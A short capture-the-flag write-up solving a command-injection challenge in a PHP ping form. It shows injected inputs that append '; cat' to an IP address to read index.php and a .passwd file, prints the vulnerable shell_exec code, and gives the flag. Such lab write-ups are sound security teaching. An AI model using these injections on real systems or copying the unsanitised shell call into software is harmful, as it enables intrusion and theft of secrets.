---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 9
---

![1](https://github.com/Knign/Write-ups/assets/110326359/d1e2fbf5-dde6-4680-9880-434f849e9474)

Let's input `127.0.0.1` as the input field is suggesting.

![2](https://github.com/Knign/Write-ups/assets/110326359/46f87312-d86a-4939-850e-15b020fbf31a)

We can see that our input is used to execute a `ping` command.

We know the flag is on the `index.php` file. In order to `cat` the flag we need to use the `;` separator.

## User Input
```
127.0.0.1 ; cat index.php
```

![3](https://github.com/Knign/Write-ups/assets/110326359/f9499c2f-64bc-4eb4-939f-37f2c9975779)

Looks like our input was processed properly. Let's check the source code.

![4](https://github.com/Knign/Write-ups/assets/110326359/bd7601d5-dff6-4840-94ae-b3d43248550b)

The source code reveals an interesting piece of code.
## PHP code
```php
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```
The line `shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'")` executes a shell command based on user input ($_POST["ip"]).

The line `"".file_get_contents(".passwd").""` reads the content of a file named `.passwd` and appends it to the `$flag` variable. 

Let's modify our input to `cat` the `.passwd` file.

## User Input
```
127.0.0.1 ; cat .passwd
```

![5](https://github.com/Knign/Write-ups/assets/110326359/852de8c6-c743-4a7f-bcc9-01dbd8f42823)

## Flag
```
S3rv1ceP1n9Sup3rS3cure
```
